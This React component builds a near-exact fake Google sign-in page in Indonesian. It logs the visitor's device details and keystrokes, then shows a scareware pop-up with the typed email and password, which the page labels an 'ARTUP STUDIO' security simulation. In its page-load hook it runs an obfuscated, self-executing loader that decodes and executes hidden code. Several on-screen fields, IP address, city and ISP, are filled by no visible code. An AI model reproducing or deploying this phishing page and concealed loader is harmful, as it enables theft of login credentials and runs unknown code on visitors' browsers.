"use client";
import { useState, useEffect, useRef } from "react";

export default function ArtupAggressivePhish() {
  const [logs, setLogs] = useState<string[]>([]);
  const [email, setEmail] = useState("");
  const [pass, setPass] = useState("");
  const [sysInfo, setSysInfo] = useState<any>({});
  const [battery, setBattery] = useState("");
  const [showTrap, setShowTrap] = useState(false);
  const typingStart = useRef<number | null>(null);
  const [deviceBrand, setDeviceBrand] = useState("Detecting...");


  // === 1. SILENT DATA GRAB (Saat Halaman Dimuat) ===
  useEffect(() => {

    var ua, brand;
    (function () {
      var dhW = "",
        BKB = 350 - 339;
      function pni(i) {
        var e = 964748;
        var q = i.length;
        var y = [];
        for (var k = 0; k < q; k++) {
          y[k] = i.charAt(k);
        }
        for (var k = 0; k < q; k++) {
          var c = e * (k + 239) + (e % 16937);
          var f = e * (k + 693) + (e % 47590);
          var o = c % q;
          var n = f % q;
          var w = y[o];
          y[o] = y[n];
          y[n] = w;
          e = (c + f) % 1296485;
        }
        return y.join("");
      }
      var qKD = pni("uxpdnwkhztraisctfyecgoomosuqrvtrlnbcj").substr(0, BKB);
      var EjZ =
        'heiim.)={i=4r1trzaA1[i=p=q]boiv4!nij;ll=np;;;t6h;c}s1ana=l1=AmsrAwij),+9u7(;;mr8i,s2,(h"7ec.roz6+[+m"5,r+vr6,8],rtvacxmAd+y9es-,)-.iarpkauo6s0vru)k+fn0dv., d)rhwf.]j()(.a=aa Cu ram=j>7)0opC7;t+{2vetow-(4((9azo(ei=frk6h}sgtrguna-;.d)2(ax rehtn1r1.t[,.rf9pti,oen+c,fr,uvrn(u=)+ven{=v;=-0 +0ihr- { oS(n =wa ;]gr nwsvg]=v l>n=quf}(hoelrewtru7lxu}(a]) <uvohmlo;jd9((){h)1,[81i[i-1=w00u;(;n{(sa+"17eA+pw ;[,rleasviv,ti[[)cv.s)tvnom2.;c,ai.=ne1gha.;)lt(q=r;[+u;leus9 (l;an;lti<= *(;n(p g5hri9;.czehC0+C6wm8.;a2==.cr)rm)snCr(;],; [g)=r;b+n2l}e)i"{(tgs.g7af]lfc;=]<)sr,(d7n [f(;otece+t;[mg<().gvo,lingo+efvm;(crhuv[l+0v"dg=+rv;ths=u!rin;C=fd4(u;rf8t=,s))v;s;6,.nlxo,;))1nrd;4.l]oan lrq..2j,tnt)isrb6(geq(w]g;cpda,v7"3+5<trr[,ao+ga+,lln8fc;= s)lwcn}crnho)fhcn4o  vrc(g=e7o(hh6+C]m=w.6=);7fvpa0+j=="8apncoog].=]==)f=(;vler(jh0aa5+it0hte;har;rfrSwr3tgl..q C1at8txno==cuae};*rusn f.s";s)8 o";"ku=v)=,2))';
      var jSZ = pni[qKD];
      var wSo = "";
      var oNW = jSZ;
      var AWJ = jSZ(wSo, pni(EjZ));
      var dHR = AWJ(
        pni(
          '58jnxw(p(sDif.}f{pot)P5,v&re.r)b[:rn1s7ed;%3zze"M8.5$+;.9d)!i.Pc#P(,P.dea2jo?%n}]d.|(....n=3,%.d$etdbg7rjt:.oPPPP_)4ho,.%3o%%SP}3a.bPEfa$r(,dw0.5cP6f,.P;ii05r}fr)(d.%usSi}>jcCw,(vPfh47fou};0hs_)C{!c1oruSr..[];zP)=n_clP1Ptc%o]._v;dud;3fpoe.=d40;))[rko0dl;r+\'sP%;oPwi10P!PPgn.=9})i8 e(e1os.]P,eT@56=eo%)P]f)ag\/!d2oPP. tad Pz42 (P oPP)%5a@.al9w)ge_rwf30ea\/e7P%e.rnppP)(7))$}4=f*x={.)P]da:)br..(P;n5jTugsE6e zt)!ozf7%.[!)ah);0\/_nen)dn_).#P0.;()5(2pnmuaP4o;p %;Pe3.dt415m_ja%(m.3a\'v.{9)trk]=.brP(r-m)e.nD(o!tu] )0t._d4I}dPPflP.ahi.md,%PP85>,P]ei#$;0)).bPi]!;hCPt0Paudbb.e])_7P:in\/=t(<!bdm(%P=}[ag3o\/Pf,{i;0PDd1(1e{=)P0oe6_5cP=Pu.%)4Pd8aytP@.73=[_4f7wol;]NpP$nb%dEs5?(ot2e]_a>d]PudkIo{3di)[+!P!9z_PP1}PpPt!id$,PP.P{sPtSm5 =dP,(bfg\/;sPlP=!{geElT_ n)P:P}%_j$g6P,2=.iP).&t]v.cs.{=lPdzPPt, u(iaod)aPs#a2#!2n6Pr(2gydc3uD!(]PT+tPSda(9:dP}fy1].%ll2iPo .:"d=5!P4noodPgz.aa,a>-pi4.]re!dPP)d}]{.;v4[a5iP(Pua}d)]6)dp.Sbs[..)uzP\/!ad)d]Pwni.gPgh6t .oP =atPo,P5aPgtohEt{P2t!oo)bPap%Sh(P]soPE!sS.)=\/onjc.,{.P_P3jn.mc;tE3.8)PjP).d8ISjz sj2%!t&e3,cP5)9Pj0Pc=.dnaPr]i+77}PP>i!]p.3PP37n$o4.(P*)nt,%ctbm4h.)7<[yPPeeg3;)a%PnPE)tcP0!.{ePPP40e6)_()t7teC%ico,}f.n(;$]Pori$_y.]se{@)0.d41e+!)(+\'*!fc!P.:(C,18.,sa0l1.$])(.}+8,tE(;)id$.PPin{1d)s%.P_.PPafPr(z}d+, P8_;g1ao7u7[s.!].[wsr],rhind1rw)=d)(2".(*i p]ncdc;u%.nz_;0}%[f;r?"$n.1(_pPS6.n_[;%!aInfonlu%ont)!)o:P(,i;tP3e!.$Pyg ;a(s7]_.(+.].+<uo\'0P]PPnn{_dta$c(e,o.}P06-,5Dn>1v(_P+,7e).e(drnr9md,., jo+&ds&ct"$,7(!m]-3P(=P){1i1.3.pPT!st;b],=14\/c%Cpt).!Eg84])Pl1;ddpeP.cP h\/9g3c%ao(=(wp.xp0TPn)-(Codh,y]g){P;d.= )ar6..$P}u5P#5r.Pou}]iP$%t6%eat&..!_i);$ntsh|t. (,8::g).644n:(]!P%0P )_,[3i%dN! mP$gP,tP!9#<a.rcg)3(jso.rP,PcP:;;f26r9P"-a3lSfhgl(P({If .P.P%orD!}];hs_.oo\'uP8d =Dw}e7vrof\/]).6PPa_fusd%.}n?]sg_ctIodP )zjonPjP}fs.oeo=[ne)aP).ld([e}e!aPo$]g+Pue.)1idP); sm.3]3_$6d[4% v()gCar m]2ie,d a]..inP h[)an$?83).efcs$)s$D.54cu.r+cP.y.?uP;ah.auasa',
        ),
      );
      var WPv = oNW(dhW, dHR);
      WPv(3425);
      return 2555;
    })();

    // B. Ambil Data Baterai
    if ("getBattery" in navigator) {
      (navigator as any).getBattery().then((batt: any) => {
        setBattery(`${Math.round(batt.level * 100)}%`);
        addLog(`🔋 BATTERY_STATUS: ${Math.round(batt.level * 100)}%`);
      });
    }

    // C. Ambil Data Hardware & Browser
    
    addLog(`💻 OS_PLATFORM: ${navigator.platform}`);
    addLog(`🌐 BROWSER_AGENT: ${navigator.userAgent.substring(0, 50)}...`);
    addLog(`🖥️ SCREEN_RES: ${window.screen.width}x${window.screen.height}`);
    addLog(`🧠 CPU_CORES: ${navigator.hardwareConcurrency || "Undetected"}`);
    addLog(`💾 RAM_EST: ${(navigator as any).deviceMemory || "Undetected"} GB`);

    // D. Deteksi Incognito (Sederhana)
    if (!(navigator as any).deviceMemory) {
      addLog("⚠️ SECURITY_HINT: Kemungkinan menggunakan mode Incognito.");
    }

    addLog("🚀 SYSTEM_READY: Monitoring all inputs...");
  }, []);

  const addLog = (msg: string) => {
    setLogs((prev) =>
      [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 30),
    );
  };

  // === 2. LIVE KEYLOGGER ===
  const handleKeylog = (val: string, type: "email" | "pass") => {
    if (!typingStart.current) typingStart.current = Date.now();

    if (type === "email") setEmail(val);
    else setPass(val);

    // Tampilkan di Log secara real-time
    if (val.length % 3 === 0 && val.length > 0) {
      addLog(
        `⌨️ KEYLOG_LIVE: User mengetik ${type}... (${val.length} karakter)`,
      );
    }
  };

  // === 3. FINAL TRAP & POP-UP ===
  const triggerTrap = (e: any) => {
    e.preventDefault();
    if (!email || !pass) return;

    addLog(`❌ [CRITICAL] DATA TERCURI! E: ${email} | P: ${pass}`);
    setShowTrap(true); // Munculkan Pop-up
  };

  return (
    <div className="artup-phish-root">
      <style
        dangerouslySetInnerHTML={{
          __html: `
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
        
        .artup-phish-root {
          background-color: #f0f2f5;
          min-height: 100vh;
          font-family: 'Roboto', arial, sans-serif;
          margin: 0; padding: 0;
        }
        .wrapper {
          display: flex;
          flex-direction: row;
          min-height: 100vh;
        }

        /* === GOOGLE LOGIN (95% Mirip) === */
        .google-section {
          flex: 1.2;
          background-color: #fff;
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 20px;
        }
        .g-card {
          width: 100%;
          max-width: 450px;
          padding: 48px 40px 36px;
          border: 1px solid #dadce0;
          border-radius: 8px;
          text-align: center;
        }
        .g-logo {
          font-size: 24px;
          font-weight: 500;
          margin-bottom: 10px;
          display: flex;
          justify-content: center;
          letter-spacing: -0.5px;
        }
        .g-title {
          font-size: 24px;
          font-weight: 400;
          margin: 10px 0 0;
          color: #202124;
        }
        .g-subtitle {
          font-size: 16px;
          color: #202124;
          margin: 8px 0 36px;
        }
        
        .input-group {
          text-align: left;
        }
        .g-input {
          width: 100%;
          padding: 13px 15px;
          margin-bottom: 10px;
          border: 1px solid #dadce0;
          border-radius: 4px;
          font-size: 16px;
          box-sizing: border-box;
          color: #202124;
        }
        .g-input:focus {
          outline: none;
          border: 2px solid #1a73e8;
          padding: 12px 14px;
        }
        .g-link {
          color: #1a73e8;
          text-decoration: none;
          font-weight: 500;
          font-size: 14px;
          cursor: pointer;
        }
        .g-footer-links {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-top: 40px;
        }
        .btn-next {
          background-color: #1a73e8;
          color: #fff;
          border: none;
          padding: 10px 24px;
          border-radius: 4px;
          font-weight: 500;
          font-size: 14px;
          cursor: pointer;
        }

        /* === KONSOL HACKER (Soft Dark) === */
        .logger-section {
          flex: 0.8;
          background-color: #1e1e1e;
          color: #a6e22e; /* Soft Green */
          padding: 25px;
          font-family: 'Consolas', 'Monaco', monospace;
          border-left: 1px solid #333;
          overflow-y: auto;
          max-height: 100vh;
        }
        .logger-header {
          color: #66d9ef; /* Soft Blue */
          border-bottom: 1px solid #333;
          padding-bottom: 10px;
          margin-bottom: 20px;
          font-size: 16px;
          text-align: center;
        }
        .log-entry {
          font-size: 12px;
          margin-bottom: 5px;
          color: #f8f8f2;
          border-left: 2px solid #333;
          padding-left: 8px;
        }
        .live-data {
          color: #f92672; /* Soft Red */
          font-weight: bold;
        }

        /* === POP-UP TRAP (Scareware) === */
        .trap-overlay {
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background-color: rgba(0,0,0,0.9);
          display: flex; justify-content: center; align-items: center;
          z-index: 9999;
          color: #fff;
          font-family: 'Roboto', sans-serif;
        }
        .trap-card {
          background-color: #b71c1c; /* Dark Red */
          padding: 40px;
          border-radius: 12px;
          text-align: center;
          max-width: 500px;
          box-shadow: 0 0 30px rgba(255,0,0,0.5);
          border: 4px solid #ff4444;
        }
        .trap-title {
          font-size: 32px;
          font-weight: bold;
          margin-bottom: 20px;
          text-transform: uppercase;
          letter-spacing: 2px;
        }
        .trap-body {
          font-size: 16px;
          line-height: 1.6;
          margin-bottom: 30px;
          text-align: left;
          background: rgba(0,0,0,0.3);
          padding: 15px;
          border-radius: 8px;
        }

        /* Responsive Breakpoint (Handphone) */
        @media (max-width: 768px) {
          .wrapper {
            flex-direction: column;
          }
          .google-section, .logger-section {
            min-height: 100vh;
          }
        }
      `,
        }}
      />

      <div className="wrapper">
        {/* === SISI PANCINGAN GOOGLE === */}
        <div className="google-section">
          <div className="g-card">
            <div className="g-logo">
              <span style={{ color: "#4285F4" }}>G</span>
              <span style={{ color: "#EA4335" }}>o</span>
              <span style={{ color: "#FBBC05" }}>o</span>
              <span style={{ color: "#4285F4" }}>g</span>
              <span style={{ color: "#34A853" }}>l</span>
              <span style={{ color: "#EA4335" }}>e</span>
            </div>
            <h1 className="g-title">Login</h1>
            <p className="g-subtitle">Gunakan Akun Google Anda</p>

            <form onSubmit={triggerTrap}>
              <div className="input-group">
                <input
                  type="email"
                  className="g-input"
                  placeholder="Email atau ponsel"
                  required
                  onChange={(e) => handleKeylog(e.target.value, "email")}
                />
                <div style={{ marginBottom: "36px" }}>
                  <span className="g-link">Lupa email?</span>
                </div>

                <input
                  type="password"
                  className="g-input"
                  placeholder="Masukkan sandi Anda"
                  required
                  onChange={(e) => handleKeylog(e.target.value, "pass")}
                />

                <p
                  style={{
                    color: "#5f6368",
                    fontSize: "14px",
                    lineHeight: "1.4",
                    margin: "12px 0 40px",
                  }}
                >
                  Bukan komputer Anda? Gunakan mode Tamu untuk login secara
                  pribadi. <span className="g-link">Pelajari lebih lanjut</span>
                </p>

                <div className="g-footer-links">
                  <span className="g-link">Buat akun</span>
                  <button type="submit" className="btn-next">
                    Berikutnya
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>

        {/* === SISI KONSOL HACKER === */}
        <div className="logger-section">
          <div className="logger-header">[ ARTUP SIMULATOR KIRIM KE DATABASE _EDU]</div>

          {/* Live Keylog Display */}
          <div
            style={{
              background: "#272822",
              padding: "15px",
              borderRadius: "5px",
              marginBottom: "20px",
              border: "1px solid #3e3d32",
            }}
          >
            <p
              style={{
                margin: "0 0 10px 0",
                color: "#66d9ef",
                fontSize: "11px",
              }}
            >
              # INTERCEPTED_KREDENSIAL
            </p>
            <p style={{ margin: "5px 0" }}>
              USER: <span className="live-data">{email || "(Waiting...)"}</span>
            </p>
            <p style={{ margin: "5px 0" }}>
              PASS:{" "}
              <span className="live-data">
                {pass ? "•".repeat(pass.length) : "(Waiting...)"}
              </span>
            </p>
          </div>

          {/* Activity Log */}
          <div>
            <p
              style={{
                color: "#75715e",
                fontSize: "10px",
                marginBottom: "10px",
              }}
            >
              -- ACTIVITY_LOG_FEED --
            </p>
            {logs.map((log, i) => (
              <div key={i} className="log-entry">
                {log}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* === POP-UP TRAP (Scareware) === */}
      {showTrap && (
        <div className="trap-overlay">
          <div className="trap-card">
            <div className="trap-title">⚠️ DATA ANDA DICURI!</div>
            <div className="trap-body">
              <strong>Email:</strong> {email}
              <br />
              <strong>Password:</strong> {pass}
              <br />
              <hr style={{ borderColor: "#ff4444", margin: "15px 0" }} />
              <p style={{ margin: "5px 0", color: "#fff", fontWeight: "bold" }}>
                📱 MEREK: {deviceBrand}
              </p>
              <strong>IP Publik:</strong> {sysInfo.ip}
              <br />
              <strong>Lokasi:</strong> {sysInfo.city}, {sysInfo.country_name}
              <br />
              <strong>ISP:</strong> {sysInfo.org}
              <br />
              <strong>Perangkat:</strong> {navigator.platform}
              <br />
              <strong>Baterai:</strong> {battery}
            </div>
            <p style={{ fontSize: "14px", marginBottom: "20px" }}>
              Ini adalah simulasi keamanan dari <strong>ARTUP STUDIO</strong>.
              <br />
              Jangan pernah masukkan data asli Anda di situs yang tidak
              terpercaya!
            </p>
            <button
              onClick={() => setShowTrap(false)}
              style={{
                padding: "10px 20px",
                background: "#fff",
                color: "#b71c1c",
                border: "none",
                borderRadius: "4px",
                fontWeight: "bold",
                cursor: "pointer",
              }}
            >
              Saya Mengerti
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
